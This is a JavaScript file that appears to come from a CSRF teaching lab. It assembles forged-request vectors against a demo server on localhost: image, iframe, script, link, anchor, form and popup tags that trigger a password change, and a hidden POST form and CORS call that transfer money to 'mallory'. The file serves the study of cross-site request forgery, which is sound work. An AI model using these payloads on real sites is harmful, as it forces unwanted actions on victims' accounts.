
$(document).ready(function() {
//var host="http://hidden-brushlands-4145.herokuapp.com/";
var host="http://localhost:3100";
var baseGetURL=host+"/changePassword";
var basePostURL=host+"/transfer";
var targetDiv=$('#targetDiv');
var getAutoURL= function(){
        return baseGetURL+"?new="+generateRandomInt(500,1000);
}
function generateRandomInt(min, max) {
        return Math.floor(Math.random() * (max - min + 1) + min);
}
var getAutoVectors={
        img: '<img src="'+getAutoURL()+'" />',
        iframe: '<iframe src="'+getAutoURL()+'"></iframe>',
        script: '<script src="'+getAutoURL()+'"></script>',
        link: '<link href="'+getAutoURL()+'" rel="stylesheet"></iframe>'
}
var getEventVectors={
        anchor: '<a id="anGet" href=" '+getAutoURL()+' " target="tgtFrame">Submit</a>',
        formGet: '<form name="frmGet" method="GET" action="'+baseGetURL+'"  target="tgtFrame">'+
                '<input type="hidden" name="new" value="'+generateRandomInt(500,1000)+'"/> </form>',
        popup:'<script>window.open("'+getAutoURL()+'");</script>',
        windowNav: '<script>window.location.href="'+getAutoURL()+'";</script>'
 }
var postEventVector={
        formPost:  '<form name="frmPost" method="POST" action="'+basePostURL+'"  target="tgtFrame">'+
                ' <input type="hidden" name="transferTo" value="mallory"/>'+
                ' <input type="hidden" name="amount" value="'+generateRandomInt(200,400)+'"/> '+
                '</form>'
 }
$('#tblGetAutoVectors').click(function(e){
        if(e.target.nodeName==='A'){
        var vector=$(e.target).attr('vector');
                if(vector === 'corsGet'){
                        //console.log('corsGet');
                        //corsLib is defined in "cors-csrf.js" file. It has  CORS GET & POST methods 
                        corsLib.get(getAutoURL());
                }
                else {
                        var markup=getAutoVectors[vector];
                        targetDiv.append(markup);
                }
        }
});
$('#tblGetEventVectors').click(function(e){
        if(e.target.nodeName==='A'){
                //$('#targetContainers').css('opacity', 1);
                var vector=$(e.target).attr('vector'); //anchor, form
                var markup=getEventVectors[vector];
                targetDiv.append(markup);
                if (vector==='anchor') { 
                        document.getElementById('anGet').click();
                } 
                if (vector==='formGet') { 
                        document.forms.frmGet.submit();
                } 
        }
});
$('#tblPostVectors').click(function(e){
                if(e.target.nodeName==='A'){
                        var vector=$(e.target).attr('vector');
                        if(vector=== 'corsPost'){
                                //console.log('corsPost');
                                var params="transferTo=mallory&amount="+generateRandomInt(200,400);
                                corsLib.post(basePostURL, params);
                        }
                        else{
                                var markup=postEventVector[vector];
                                targetDiv.append(markup);
                                document.forms.frmPost.submit();
                        }
                }
        });
});
